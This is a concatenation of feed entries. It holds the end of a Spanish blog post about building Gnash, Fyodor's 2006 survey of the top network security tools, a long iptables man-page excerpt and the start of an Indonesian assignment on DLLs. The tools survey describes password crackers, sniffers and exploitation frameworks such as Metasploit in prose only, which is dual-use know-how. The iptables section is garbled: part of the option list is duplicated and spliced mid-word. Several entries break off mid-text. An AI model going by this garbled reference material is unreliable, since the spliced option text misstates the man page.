oficial para ninguna de las anteriores plataformas, aparte de GNU/Linux aunque únicamente sobre x86. El proyecto ha servido a los usuarios de FreeBSD al no tener disponible la versión oficial del plug-in, el cual solo se puede usar a través de la capa de emulación de Linux o usando la versión del navegador de Windows con Wine.Lo último citado es muy interesante ya que me hace llegar a reflexionar sobre lo que he leído de Gnash en algunos sitios; quienes sólo se limitan (dentro de su mundo x86) diciendo cosas como que Gnash siempre irá un paso atrás de Adobe y cosas como esa. Pero no se detienen a pensar que Gnash ha sido escrito sin usar el código de Adobe a demás de que por ser libre está al alcance de muchos.  Vamos ahora con NeonatoX:  Desde que escribí el artículo de Swfdec, me estuvo rondando por la mente vencer los obstáculos para compilar Gnash, finalmente me bajé el código fuente junto con el de sus dependencias y ayer 04/09/2009 me senté en la noche a darle la vuelta hasta que ¡lo conseguí!  Una vez abierto el IceCat fue realmente emocionante verlo funcionando (Notando que Gnash tarda en un PIV mas de una hora y las dependencias ni se diga ;))...  Las dependencias para compilarlo son las mismas que necesita Swfdec más unas tres que son dependencias de compilación y la de renderizado que es AGG, y Csound que son herramientas para el sonido. Como estoy trabajando aun con el viejo Nhopkg (0.4.3), los paquetes estarán primero disponibles para esta versión, en breve estarán para la 0.5 ;).  Es sólo cuestión de esperar para que esté en la 0.48.5 y por supuesto en la 0.5. Para despedir les muestro algunas capturas de hoy hechas con Gnash.      Enlaces de interés: http://www.gnu.org/software/gnash/ (Web Oficial) http://swfdec.freedesktop.org/wiki/ (Web Oficial)http://es.wikipedia.org/wiki/Gnash (Artículo Enciclopédico) http://en.wikipedia.org/wiki/Swfdec (Artículo Enciclopédico)http://es.wikipedia.org/wiki/X86 El Simpicuitico: SwfdecNos estamos leyendo...]]></summary>

  <title><![CDATA[Top 100 Network Security Tools (by http://sectools.org/)]]></title>
  <summary><![CDATA[Top 100 Network Security Tools After the tremendously successful 2000 and 2003 security tools surveys, Insecure.Org is delighted to release this 2006 survey.  I (Fyodor) asked users from the nmap-hackers mailing list to share their favorite tools, and 3,243 people responded.  This allowed me to expand the list to 100 tools, and even subdivide them into categories.  Anyone in the security field would be well advised to go over the list and investigate tools they are unfamiliar with.  I discovered several powerful new tools this way.  I also point newbies to this site whenever they write me saying “I don't know where to start”.   Respondents were allowed to list open source or commercial tools on any platform.  Commercial tools are noted as such in the list below. No votes for the Nmap Security Scanner were counted because the survey was taken on a Nmap mailing list.  This audience also biases the list slightly toward “attack” hacking tools rather than defensive ones.   Each tool is described by one ore more attributes:  Did not appear on the 2003 list /Popularity ranking rose /  fell the given number since the 2003 survey Generally costs money.  A free limited/demo/trial version may be available. Works natively on Linux Works natively on OpenBSD, FreeBSD, Solaris, and/or other UNIX variants Works natively on Apple Mac OS X Works natively on Microsoft Windows Features a command-line interface Offers a GUI (point and click) interface Source code available for inspection.    Please send updates and suggestions (or better tool logos) to Fyodor.  If your tool is featured or you think your site visitors might enjoy this list, you are welcome to use our link banners.   Here is the list, starting with the most popular:   #1         Nessus : Premier UNIX vulnerability assessment tool Nessus was a popular free and open source vulnerability scanner until they closed the source code in 2005 and removed the free "registered feed" version in 2008. A limited “Home Feed” is still available, though it is only licensed for home network use. Some people avoid paying by violating the “Home Feed” license, or by avoiding feeds entirely and using just the plugins included with each release. But for most users, the cost has increased from free to $1200/year. Despite this, Nessus is still the best UNIX vulnerability scanner available and among the best to run on Windows. Nessus is constantly updated, with more than 20,000 plugins. Key features include remote and local (authenticated) security checks, a client/server architecture with a GTK graphical interface, and an embedded scripting language for writing your own plugins or understanding the existing ones. See all vulnerability scanners    #2          Wireshark : Sniffing the glue that holds the Internet together Wireshark (known as Ethereal until a trademark dispute in Summer 2006) is a fantastic open source network protocol analyzer for Unix and Windows. It allows you to examine data from a live network or from a capture file on disk. You can interactively browse the capture data, delving down into just the level of packet detail you need. Wireshark has several powerful features, including a rich display filter language and the ability to view the reconstructed stream of a TCP session. It also supports hundreds of protocols and media types. A tcpdump-like console version named tethereal is included. One word of caution is that Ethereal has suffered from dozens of remotely exploitable security holes, so stay up-to-date and be wary of running it on untrusted or hostile networks (such as security conferences). See all packet sniffers   #3          Snort : Everyone's favorite open source IDS This lightweight network intrusion detection and prevention system excels at traffic analysis and packet logging on IP networks. Through protocol analysis, content searching, and various pre-processors, Snort detects thousands of worms, vulnerability exploit attempts, port scans, and other suspicious behavior. Snort uses a flexible rule-based language to describe traffic that it should collect or pass, and a modular detection engine. Also check out the free Basic Analysis and Security Engine (BASE), a web interface for analyzing Snort alerts. Open source Snort works fine for many individuals, small businesses, and departments.  Parent company SourceFire offers a complimentary product line with more enterprise-level features and real-time rule updates. They offer a free (with registration) 5-day-delayed rules feed, and you can also find many great free rules at Bleeding Edge Snort.   See all intrusion detection systems   #4         Netcat : The network Swiss army knife This simple utility reads and writes data across TCP or UDP network connections. It is designed to be a reliable back-end tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need, including port binding to accept incoming connections. The original Netcat was released by Hobbit in 1995, but it hasn't been maintained despite its immense popularity.  It can sometimes even be hard to find nc110.tgz. The flexibility and usefulness of this tool have prompted people to write numerous other Netcat implementations - often with modern features not found in the original. One of the most interesting is Socat, which extends Netcat to support many other socket types, SSL encryption, SOCKS proxies, and more. It even made this list on its own merits. There is also Chris Gibson's Ncat, which offers even more features while remaining portable and compact.  Other takes on Netcat include OpenBSD's nc, Cryptcat, Netcat6, PNetcat, SBD, and so-called GNU Netcat.  See all Netcats   #5          Metasploit Framework : Hack the Planet Metasploit took the security world by storm when it was released in 2004. No other new tool even broke into the top 15 of this list, yet Metasploit comes in at #5, ahead of many well-loved tools that have been developed for more than a decade. It is an advanced open-source platform for developing, testing, and using exploit code. The extensible model through which payloads, encoders, no-op generators, and exploits can be integrated has made it possible to use the Metasploit Framework as an outlet for cutting-edge exploitation research. It ships with hundreds of exploits, as you can see in their online exploit building demo. This makes writing your own exploits easier, and it certainly beats scouring the darkest corners of the Internet for illicit shellcode of dubious quality. Similar professional exploitation tools, such as Core Impact and Canvas already existed for wealthy users on all sides of the ethical spectrum. Metasploit simply brought this capability to the masses. See all vulnerability exploitation tools   #6         Hping2 : A network probing utility like ping on steroids This handy little utility assembles and sends custom ICMP, UDP, or TCP packets and then displays any replies. It was inspired by the ping command, but offers far more control over the probes sent. It also has a handy traceroute mode and supports IP fragmentation. This tool is particularly useful when trying to traceroute/ping/probe hosts behind a firewall that blocks attempts using the standard utilities. This often allows you to map out firewall rulesets. It is also great for learning more about TCP/IP and experimenting with IP protocols. See all packet crafting tools   #7 10         Kismet : A powerful wireless sniffer Kismet is an console (ncurses) based 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. It identifies networks by passively sniffing (as opposed to more active tools such as NetStumbler), and can even decloak hidden (non-beaconing) networks if they are in use. It can automatically detect network IP blocks by sniffing TCP, UDP, ARP, and DHCP packets, log traffic in Wireshark/TCPDump compatible format, and even plot detected networks and estimated ranges on downloaded maps. As you might expect, this tool is commonly used for wardriving.  Oh, and also warwalking, warflying, and warskating, ...  See all wireless tools, and packet sniffers   #8 3         Tcpdump : The classic sniffer for network monitoring and data acquisition Tcpdump is the IP sniffer we all used before Ethereal (Wireshark) came on the scene, and many of us continue to use it frequently. It may not have the bells and whistles (such as a pretty GUI or parsing logic for hundreds of application protocols) that Wireshark has, but it does the job well and with fewer security holes. It also requires fewer system resources. While it doesn't receive new features often, it is actively maintained to fix bugs and portability problems. It is great for tracking down network problems or monitoring activity. There is a separate Windows port named WinDump.  TCPDump is the source of the Libpcap/WinPcap packet capture library, which is used by Nmap among many other tools.  See all packet sniffers   #9 23     Cain and Abel : The top password recovery tool for Windows UNIX users often smugly assert that the best free security tools support their platform first, and Windows ports are often an afterthought. They are usually right, but Cain & Abel is a glaring exception. This Windows-only password recovery tool handles an enormous variety of tasks. It can recover passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, revealing password boxes, uncovering cached passwords and analyzing routing protocols. It is also well documented.  See all password crackers, and packet sniffers   #10 1         John the Ripper : A powerful, flexible, and fast multi-platform password hash cracker John the Ripper is a fast password cracker, currently available for many flavors of Unix (11 are officially supported, not counting different architectures), DOS, Win32, BeOS, and OpenVMS. Its primary purpose is to detect weak Unix passwords. It supports several crypt(3) password hash types which are most commonly found on various Unix flavors, as well as Kerberos AFS and Windows NT/2000/XP LM hashes. Several other hash types are added with contributed patches. You will want to start with some wordlists, which you can find here, here, or here.  See all password crackers   #11 2          Ettercap : In case you still thought switched LANs provide much extra security Ettercap is a terminal-based network sniffer/interceptor/logger for ethernet LANs. It supports active and passive dissection of many protocols (even ciphered ones, like ssh and https). Data injection in an established connection and filtering on the fly is also possible, keeping the connection synchronized. Many sniffing modes were implemented to give you a powerful and complete sniffing suite. Plugins are supported. It has the ability to check whether you are in a switched LAN or not, and to use OS fingerprints (active or passive) to let you know the geometry of the LAN. See all packet sniffers   #12 <span s]]></summary>

  <title><![CDATA[iptables command]]></title>
  <summary><![CDATA[iptables is the userspace command line program used to configure the Linux 2.4.x and 2.6.x IPv4 packet filtering ruleset. It is targeted towards system administrators. Since Network Address Translation is also configured from the packet filter ruleset, iptables is used for this, too. The iptables package also includes ip6tables. ip6tables is used for configuring the IPv6 packet filter. Command iptables - administration tool for IPv4 packet filtering and NAT Synopsis window.google_render_ad(); iptables [-t table] -[AD] chain rule-specification [options]iptables [-t table] -I chain [rulenum] rule-specification [options]iptables [-t table] -R chain rulenum rule-specification [options]iptables [-t table] -D chain rulenum [options]iptables [-t table] -[LFZ] [chain] [options]iptables [-t table] -N chainiptables [-t table] -X [chain]iptables [-t table] -P chain target [options]iptables [-t table] -E old-chain-name new-chain-name Description Iptables is used to set up, maintain, and inspect the tables of IP packet filter rules in the Linux kernel. Several different tables may be defined. Each table contains a number of built-in chains and may also contain user-defined chains. Each chain is a list of rules which can match a set of packets. Each rule specifies what to do with a packet that matches. This is called a 'target', which may be a jump to a user-defined chain in the same table. Targets A firewall rule specifies criteria for a packet, and a target. If the packet does not match, the next rule in the chain is the examined; if it does match, then the next rule is specified by the value of the target, which can be the name of a user-defined chain or one of the special values ACCEPT, DROP, QUEUE, or RETURN. ACCEPT means to let the packet through. DROP means to drop the packet on the floor. QUEUE means to pass the packet to userspace. (How the packet can be received by a userspace process differs by the particular queue handler. 2.4.x and 2.6.x kernels up to 2.6.13 include the ip_queue queue handler. Kernels 2.6.14 and later additionally include the nfnetlink_queue queue handler. Packets with a target of QUEUE will be sent to queue number '0' in this case. Please also see the NFQUEUE target as described later in this man page.) RETURN means stop traversing this chain and resume at the next rule in the previous (calling) chain. If the end of a built-in chain is reached or a rule in a built-in chain with target RETURN is matched, the target specified by the chain policy determines the fate of the packet. Tables There are currently three independent tables (which tables are present at any time depends on the kernel configuration options and which modules are present). -t, --table table This option specifies the packet matching table which the command should operate on. If the kernel is configured with automatic module loading, an attempt will be made to load the appropriate module for that table if it is not already there. The tables are as follows: filter: This is the default table (if no -t option is passed). It contains the built-in chains INPUT (for packets destined to local sockets), FORWARD (for packets being routed through the box), and OUTPUT (for locally-generated packets). nat: This table is consulted when a packet that creates a new connection is encountered. It consists of three built-ins: PREROUTING (for altering packets as soon as they come in), OUTPUT (for altering locally-generated packets before routing), and POSTROUTING (for altering packets as they are about to go out). mangle: This table is used for specialized packet alteration. Until kernel 2.4.17 it had two built-in chains: PREROUTING (for altering incoming packets before routing) and OUTPUT (for altering locally-generated packets before routing). Since kernel 2.4.18, three other built-in chains are also supported: INPUT (for packets coming into the box itself), FORWARD (for altering packets being routed through the box), and POSTROUTING (for altering packets as they are about to go out). raw: This table is used mainly for configuring exemptions from connection tracking in combination with the NOTRACK target. It registers at the netfilter hooks with higher priority and is thus called before ip_conntrack, or any other IP tables. It provides the following built-in chains: PREROUTING (for packets arriving via any network interface) OUTPUT (for packets generated by local processes) Options The options that are recognized by iptables can be divided into several different groups. COMMANDS These options specify the specific action to perform. Only one of them can be specified on the command line unless otherwise specified below. For all the long versions of the command and option names, you need to use only enough letters to ensure that iptables can differentiate it from all other options. -A, --append chain rule-specification Append one or more rules to the end of the selected chain. When the source and/or destination names resolve to more than one address, a rule will be added for each possible address combination. -D, --delete chain rule-specification -D, --delete chain rulenum Delete one or more rules from the selected chain. There are two versions of this command: the rule can be specified as a number in the chain (starting at 1 for the first rule) or a rule to match. -I, --insert chain [rulenum] rule-specification Insert one or more rules in the selected chain as the given rule number. So, if the rule number is 1, the rule or rules are inserted at the head of the chain. This is also the default if no rule number is specified. -R, --replace chain rulenum rule-specification Replace a rule in the selected chain. If the source and/or destination names resolve to multiple addresses, the command will fail. Rules are numbered starting at 1. -L, --list [chain] List all rules in the selected chain. If no chain is selected, all chains are listed. As every other iptables command, it applies to the specified table (filter is the default), so NAT rules get listed by iptables -t nat -n -LPlease note that it is often used with the -n option, in order to avoid long reverse DNS lookups. It is legal to specify the -Z (zero) option as well, in which case the chain(s) will be atomically listed and zeroed. The exact output is affected by the other arguments given. The exact rules are suppressed until you use iptables -L -v -F, --flush [chain] Flush the selected chain (all the chains in the table if none is given). This is equivalent to deleting all the rules one by one. -Z, --zero [chain] Zero the packet and byte counters in all chains. It is legal to specify the -L, --list (list) option as well, to see the counters immediately before they are cleared. (See above.) -N, --new-chain chain Create a new user-defined chain by the given name. There must be no target of that name already. -X, --delete-chain [chain] Delete the optional user-defined chain specified. There must be no references to the chain. If there are, you must delete or replace the referring rules before the chain can be deleted. The chain must be empty, i.e. not contain any rules. If no argument is given, it will attempt to delete every non-builtin chain in the table. -P, --policy chain target Set the policy for the chain to the given target. See the section TARGETS for the legal targets. Only built-in (non-user-defined) chains can have policies, and neither built-in nor user-defined chains can be policy targets. -E, --rename-chain old-chain new-chain Rename the user specified chain to the user supplied name. This is cosmetic, and has no effect on the structure of the table. -h Help. Give a (currently very brief) description of the command syntax. PARAMETERS The following parameters make up a rule specification (as used in the add, delete, insert, replace and append commands). -p, --protocol [!] protocol The protocol of the rule or of the packet to check. The specified protocol can be one of tcp, udp, icmp, or all, or it can be a numeric value, representing one of these protocols or a different one. A protocol name from /etc/protocols is also allowed. A "!" argument before the protocol inverts the test. The number zero is equivalent to all. Protocol all will match with all protocols and is taken as default when this option is omitted. -s, --source [!] address[/mask] Source specification. Address can be either a network name, a hostname (please note that specifying any name to be resolved with a remote query such as DNS is a really bad idea), a network IP address (with /mask), or a plain IP address. The mask can be either a network mask or a plain number, specifying the number of 1's at the left side of the network mask. Thus, a mask of 24 is equivalent to 255.255.255.0. A "!" argument before the address specification inverts the sense of the address. The flag --src is an alias for this option. -d, --destination [!] address[/mask] Destination specification. See the description of the -s (source) flag for a detailed description of the syntax. The flag --dst is an alias for this option. -j, --jump target This specifies the target of the rule; i.e., what to do if the packet matches it. The target can be a user-defined chain (other than the one this rule is in), one of the special builtin targets which decide the fate of the packet immediately, or an extension (see EXTENSIONS below). If this option is omitted in a rule (and -g is not used), then matching the rule will have no effect on the packet's fate, but the counters on the rule will be incremented. -g, --goto chain This specifies that the processing should continue in a user specified chain. Unlike the --jump option return will not continue processing in this chain but instead in the chain that called us via --jump. -i, --in-interface [!] name Name of an interface via which a packet was received (only for packets entering the INPUT, FORWARD and PREROUTING chains). When the "!" argument is used before the interface name, the sense is inverted. If the interface name ends in a "+", then any interface which begins with this name will match. If this option is omitted, any interface name will match. -o, --out-interface [!] name Name of an interface via which a packet is going to be sent (for packets entering the FORWARD, OUTPUT and POSTROUTING chains). When the "!" argument is used before the interface name, the sense is inverted. If the interface name ends in a "+", then any interface which begins with this name will match. If this option is omitted, any interface name will match. [!] -f, --fragment This means that the rule only refers to second and further fragments of fragmented packets. Since there is no way to tell the source or destination ports of such a packet (or ICMP type), such a packet will not match any rules which specify them. When the "!" argument precedes the "-f" flag, the rule will only match head fragments, or unfragmented packets. -c, --set-counters PKTS BYTES This enables the administrator to initialize the packet and byte counters of a rule (during INSERT, APPEND, REPLACE operations). OTHER OPTIONS The following additional options can be specified: -v, --verbose Verbose output. This option makes the list command show the interface name, the rule options (if any), and the TOS masks. The packet and byte counters are also listed, with the suffix 'K', 'M' or 'G' for 1000, 1,000,000 and 1,000,000,000 multipliers respectively (but see the -x flag to change this). For appending, insertion, deletion and replacement, this causes detailed information on the rule or rules to be printed. -n, --numeric Numeric output. IP addresses and port numbers will be printed in numeric format. By default, the program will try to display them as host names, network names, or services (whenever applicable). -x, --exact Expand numbers. Display the exact value of the packet and byte counters, instead of only the rounded number in K's (multiples of 1000) M's (multiples of 1000K) or G's (multiples of 1n, --numeric Numeric output. IP addresses and port numbers will be printed in numeric format. By default, the program will try to display them as host names, network names, or services (whenever applicable). -x, --exact Expand numbers. Display the exact value of the packet and byte counters, instead of only the rounded number in K's (multiples of 1000) M's (multiples of 1000K) or G's (multiples of 1000M). This option is only relevant for the -L command. --line-numbers When listing rules, add line numbers to the beginning of each rule, corresponding to that rule's position in the chain. --modprobe=command When adding or inserting rules into a chain, use command to load any necessary modules (targets, match extensions, etc). Match Extensions000M). This option is only relevant for the -L command. --line-numbers When listing rules, add line numbers to the beginning of each rule, corresponding to that rule's position in the chain. --modprobe=command When adding or inserting rules into a chain, use command to load any necessary modules (targets, match extensions, etc). Match Extensions iptables can use extended packet matching modules. These are loaded in two ways: implicitly, when -p or --protocol is specified, or with the -m or --match options, followed by the matching module name; after these, various extra command line options become available, depending on the specific module. You can specify multiple extended match modules in one line, and you can use the -h or --help options after the module has been specified to receive help specific to that module. The following are included in the base package, and most of these can be preceded by a ! to invert the sense of the match. account Account traffic for all hosts in defined network/netmask. Features: - long (one counter per protocol TCP/UDP/IMCP/Other) and short statistics - one iptables rule for all hosts in network/netmask - loading/saving counters (by reading/writting to procfs entries) --aaddr network/netmask defines network/netmask for which make statistics. --aname name defines name of list where statistics will be kept. If no is specified DEFAULT will be used. --ashort table will colect only short statistics (only total counters without splitting it into protocols. Example usage: account traffic for/to 192.168.0.0/24 network into table mynetwork: # iptables -A FORWARD -m account --aname mynetwork --aaddr 192.168.0.0/24 account traffic for/to WWW serwer for 192.168.0.0/24 network into table mywwwserver: # iptables -A INPUT -p tcp --dport 80 -m account --aname mywwwserver --aaddr 192.168.0.0/24 --ashort # iptables -A OUTPUT -p tcp --sport 80 -m account --aname mywwwserver --aaddr 192.168.0.0/24 --ashort read counters # cat /proc/net/ipt_account/mynetwork # cat /proc/net/ipt_account/mywwwserver # echo "ip = 192.168.0.1 packets_src = 0" > /proc/net/ipt_account/mywwserver  addrtype This module matches packets based on their address type. Address types are used within the kernel networking stack and categorize addresses into various groups. The exact definition of that group depends on the specific layer three protocol. The following address types are possible: UNSPEC an unspecified address (i.e. 0.0.0.0) UNICAST an unicast address LOCAL a local address BROADCAST a broadcast address ANYCAST an anycast packet MULTICAST a multicast address BLACKHOLE a blackhole address UNREACHABLE an unreachable address PROHIBIT a prohibited address THROW FIXME NAT FIXME XRESOLVE FIXME --src-type type Matches if the source address is of given type --dst-type type Matches if the destination address is of given type ah This module matches the SPIs in Authentication header of IPsec packets. --ahspi [!] spi[:spi] childlevel This is an experimental module. It matches on whether the packet is part of a master connection or one of its children (or grandchildren, etc). For instance, most packets are level 0. FTP data transfer is level 1. --childlevel [!] level comment Allows you to add comments (up to 256 characters) to any rule. --comment comment Example: iptables -A INPUT -s 192.168.0.0/16 -m comment --comment "A privatized IP block" condition This matches if a specific /proc filename is '0' or '1'. --condition [!] filename Match on boolean value stored in /proc/net/ipt_condition/filename file connbytes Match by how many bytes or packets a connection (or one of the two flows constituting the connection) have tranferred so far, or by average bytes per packet. The counters are 64bit and are thus not expected to overflow ;) The primary use is to detect long-lived downloads and mark them to be scheduled using a lower priority band in traffic control. The transfered bytes per connection can also be viewed through /proc/net/ip_conntrack and accessed via ctnetlink [!] --connbytes from:[to] match packets from a connection whose packets/bytes/average packet size is more than FROM and less than TO bytes/packets. if TO is omitted only FROM check is done. "!" is used to match packets not falling in the range. --connbytes-dir [originalreplyboth] which packets to consider --connbytes-mode [packetsbytesavgpkt] whether to check the amount of packets, number of bytes transferred or the average size (in bytes) of all packets received so far. Note that when "both" is used together with "avgpkt", and data is going (mainly) only in one direction (for example HTTP), the average packet size will be about half of the actual data packets. Example: iptables .. -m connbytes --connbytes 10000:100000 --connbytes-dir both --connbytes-mode bytes ... connlimit Allows you to restrict the number of parallel TCP connections to a server per client IP address (or address block). [!] --connlimit-above n match if the number of existing tcp connections is (not) above n --connlimit-mask bits group hosts using mask Examples: # allow 2 telnet connections per client host iptables -p tcp --syn --dport 23 -m connlimit --connlimit-above 2 -j REJECT # you can also match the other way around: iptables -p tcp --syn --dport 23 -m connlimit ! --connlimit-above 2 -j ACCEPT # limit the nr of parallel http requests to 16 per class C sized network (24 bit netmask) iptables -p tcp --syn --dport 80 -m connlimit --connlimit-above 16 --connlimit-mask 24 -j REJECT connmark This module matches the netfilter mark field associated with a connection (which can be set using the CONNMARK target below). --mark value[/mask] Matches packets in connections with the given mark value (if a mask is specified, this is logically ANDed with the mark before the comparison). connrate This module matches the current transfer rate in a connection. --connrate [!] [from]:[to] Match against the current connection transfer rate being within 'from' and 'to' bytes per second. When the "!" argument is used before the range, the sense of the match is inverted. conntrack This module, when combined with connection tracking, allows access to more connection tracking information than the "state" match. (this module is present only if iptables was compiled under a kernel supporting this feature) --ctstate state Where state is a comma separated list of the connection states to match. Possible states are INVALID meaning that the packet is associated with no known connection, ESTABLISHED meaning that the packet is associated with a connection which has seen packets in both directions, NEW meaning that the packet has started a new connection, or otherwise associated with a connection which has not seen packets in both directions, and RELATED meaning that the packet is starting a new connection, but is associated with an existing connection, such as an FTP data transfer, or an ICMP error. SNAT A virtual state, matching if the original source address differs from the reply destination. DNAT A virtual state, matching if the original destination differs from the reply source. --ctproto proto Protocol to match (by number or name) --ctorigsrc [!] address[/mask] Match against original source address --ctorigdst [!] address[/mask] Match against original destination address --ctreplsrc [!] address[/mask] Match against reply source address --ctrepldst [!] address[/mask] Match against reply destination address --ctstatus [NONEEXPECTEDSEEN_REPLYASSURED][,...] Match against internal conntrack states --ctexpire time[:time] Match remaining lifetime in seconds against given value or range of values (inclusive) dccp --source-port,--sport [!] port[:port] --destination-port,--dport [!] port[:port] --dccp-types [!] mask Match when the DCCP packet type is one of 'mask'. 'mask' is a comma-separated list of packet types. Packet types are: REQUEST RESPONSE DATA ACK DATAACK CLOSEREQ CLOSE RESET SYNC SYNCACK INVALID. --dccp-option [!] number Match if DCP option set. dscp This module matches the 6 bit DSCP field within the TOS field in the IP header. DSCP has superseded TOS within the IETF. --dscp value Match against a numeric (decimal or hex) value [0-32]. --dscp-class DiffServ Class Match the DiffServ class. This value may be any of the BE, EF, AFxx or CSx classes. It will then be converted into it's according numeric value. dstlimit This module allows you to limit the packet per second (pps) rate on a per destination IP or per destination port base. As opposed to the 'limit' match, every destination ip / destination port has it's own limit. THIS MODULE IS DEPRECATED AND HAS BEEN REPLACED BY ''hashlimit'' --dstlimit avg Maximum average match rate (packets per second unless followed by /sec /minute /hour /day postfixes). --dstlimit-mode mode The limiting hashmode. Is the specified limit per dstip, dstip-dstport tuple, srcip-dstip tuple, or per srcipdstip-dstport tuple. --dstlimit-name name Name for /proc/net/ipt_dstlimit/* file entry [--dstlimit-burst burst] Number of packets to match in a burst. Default: 5 [--dstlimit-htable-size size] Number of buckets in the hashtable [--dstlimit-htable-max max] Maximum number of entries in the hashtable [--dstlimit-htable-gcinterval interval] Interval between garbage collection runs of the hashtable (in miliseconds). Default is 1000 (1 second). [--dstlimit-htable-expire time After which time are idle entries expired from hashtable (in miliseconds)? Default is 10000 (10 seconds). ecn This allows you to match the ECN bits of the IPv4 and TCP header. ECN is the Explicit Congestion Notification mechanism as specified in RFC3168 --ecn-tcp-cwr This matches if the TCP ECN CWR (Congestion Window Received) bit is set. --ecn-tcp-ece This matches if the TCP ECN ECE (ECN Echo) bit is set. --ecn-ip-ect num This matches a particular IPv4 ECT (ECN-Capable Transport). You have to specify a number between '0' and '3'. esp This module matches the SPIs in ESP header of IPsec packets. --espspi [!] spi[:spi] fuzzy This module matches a rate limit based on a fuzzy logic controller [FLC] --lower-limit number Specifies the lower limit (in packets per second). --upper-limit number Specifies the upper limit (in packets per second). hashlimit This patch adds a new match called 'hashlimit'. The idea is to have something like 'limit', but either per destination-ip or per (destip,destport) tuple. It gives you the ability to express '1000 packets per second for every host in 192.168.0.0/16' '100 packets per second for every service of 192.168.1.1' with a single iptables rule. --hashlimit rate A rate just like the limit match --hashlimit-burst num Burst value, just like limit match --hashlimit-mode destip  destip-destport Limit per IP or per port --hashlimit-name foo The name for the /proc/net/ipt_hashlimit/foo entry --hashlimit-htable-size num The number of buckets of the hash table --hashlimit-htable-max num Maximum entries in the hash --hashlimit-htable-expire num After how many miliseconds do hash entries expire --hashlimit-htable-gcinterval num How many miliseconds between garbage collection intervals helper This module matches packets related to a specific conntrack-helper. --helper string Matches packets related to the specified conntrack-helper. string can be "ftp" for packets related to a ftp-session on default port. For other ports append -portnr to the value, ie. "ftp-2121". Same rules apply for other conntrack-helpers. icmp This extension is loaded if '--protocol icmp' is specified. It provides the following option: --icmp-type [!] typename This allows specification of the ICMP type, which can be a numeric ICMP type, or one of the ICMP type names shown by the command iptables -p icmp -h iprange This matches on a given arbitrary range of IPv4 addresses [!]--src-range ip-ip Match source IP in the specified range. [!]--dst-range ip-ip Match destination IP in the specified range. ipv4options Match on IPv4 header options like source routing, record route, timestamp and router-alert. --ssrr To match packets with the flag strict source routing. --lsrr To match packets with the flag loose source routing. --no-srr To match packets with no flag for source routing. [!] --rr To match packets with the RR flag. [!] --ts To match packets with the TS flag. [!] --ra To match packets with the router-alert option. [!] --any-opt To match a packet with at least one IP option, or no IP option at all if ! is chosen. Examples: $ iptables -A input -m ipv4options --rr -j DROP will drop packets with the record-route flag. $ iptables -A input -m ipv4options --ts -j DROP will drop packets with the timestamp flag. length This module matches the length of a packet against a specific value or range of values. --length [!] length[:length] limit This module matches at a limited rate using a token bucket filter. A rule using this extension will match until this limit is reached (unless the '!' flag is used). It can be used in combination with the LOG target to give limited logging, for example. --limit rate Maximum average matching rate: specified as a number, with an optional '/second', '/minute', '/hour', or '/day' suffix; the default is 3/hour. --limit-burst number Maximum initial number of packets to match: this number gets recharged by one every time the limit specified above is not reached, up to this number; the default is 5. mac --mac-source [!] address Match source MAC address. It must be of the form XX:XX:XX:XX:XX:XX. Note that this only makes sense for packets coming from an Ethernet device and entering the PREROUTING, FORWARD or INPUT chains. mark This module matches the netfilter mark field associated with a packet (which can be set using the MARK target below). --mark value[/mask] Matches packets with the given unsigned mark value (if a mask is specified, this is logically ANDed with the mask before the comparison). mport This module matches a set of source or destination ports. Up to 15 ports can be specified. It can only be used in conjunction with -p tcp or -p udp. --source-ports port[,port[,port...]] Match if the source port is one of the given ports. The flag --sports is a convenient alias for this option. --destination-ports port[,port[,port...]] Match if the destination port is one of the given ports. The flag --dports is a convenient alias for this option. --ports port[,port[,port...]] Match if the both the source and destination ports are equal to each other and to one of the given ports. multiport This module matches a set of source or destination ports. Up to 15 ports can be specified. A port range (port:port) counts as two ports. It can only be used in conjunction with -p tcp or -p udp. --source-ports [!] port[,port[,port:port...]] Match if the source port is one of the given ports. The flag --sports is a convenient alias for this option. --destination-ports [!] port[,port[,port:port...]] Match if the destination port is one of the given ports. The flag --dports is a convenient alias for this option. --ports [!] port[,port[,port:port...]] Match if either the source or destination ports are equal to one of the given ports. nth This module matches every 'n'th packet --every value Match every 'value' packet [--counter num] Use internal counter number 'num'. Default is '0'. [--start num] Initialize the counter at the number 'num' insetad of '0'. Most between '0' and 'value'-1. [--packet num] Match on 'num' packet. Most be between '0' and 'value'-1. osf The idea of passive OS fingerprint matching exists for quite a long time, but was created as extension fo OpenBSD pf only so]]></summary>

  <summary><![CDATA[TUGAS_2       Nama                          :  Emannurrachmadi   Nim                             :  12080579   Prody                          :  TI   Mata Kuliah               :  Sistem Operasi           DYNAMIC LINK LIBRARY ( DLL )       Dynamic Link Library atau DLL merupakan file yang berisi rutin (procedure dan function) yang dapat dipanggil dari file EXE maupun dari file DLL lain. Dengan meletakkan rutin-rutin pada file DLL (terpisah dari file EXE) maka terdapat beberapa keuntungan. Pertama, rutin-rutin yang bersifat umum dapat dipakai oleh beberapa aplikasi pada saat yang bersamaan dan hanya diperlukan satu copy di memory atau disk. Anda dapat mengatur supaya rutin-rutin yang terdapat pada DLL tersebut dimuat ke memory hanya saat diperlukan saja. Jika tidak diperlukan maka DLL tersebut dapat dibuang dari memory.   Dengan demikian aplikasi yang Anda buat dapat lebih menghemat penggunaan memory. Keuntungan kedua, aplikasi menjadi bersifat modular. Anda dapat melakukan update aplikasi yang Anda buat tanpa harus mengupdate file EXE. Dengan demikian Anda cukup menyertakan patches kepada program Anda tanpa Anda harus menyertakan seluaruh aplikasi.Keuntungan lain adalah ukuran file EXE menjadi lebih kecil karena beberapa kode program diletakkan pada file DLL. DLL (Dynamic Link Library) dan OCX yang formatnya sebenarnya sama dengan tipe EXE, hanya saja tidak langsung dijalankan, melainkan digunakan oleh file lain seperti EXE.        Pemanfaatan File AcctInfo.dll Untuk Ekstensifikasi Atribut Objek       Acctinfo.dll merupakan dynamic link library yang memperluas fungsionalitas dari Microsoft Management Console (MMC) Active Directory Users and Computers snap-in yang disediakan oleh Microsoft. dengan menginstal acctinfo.dll maka kita menambah tab baru berupa tab Additional Account Info pada properti dari objek user. pada dasarnya kita dapat meregistrasikan AcctInfo.dll pada server atau pada workstation yang memiliki console Active Directory Users and Computers. Tambahan tab Additional Account Info ini hanya muncul pada standalone Active Directory Users and Computers saja dan tidak muncul pada node Active Directory Users and Computers di Server Manager.   Untuk menginstalnya kita 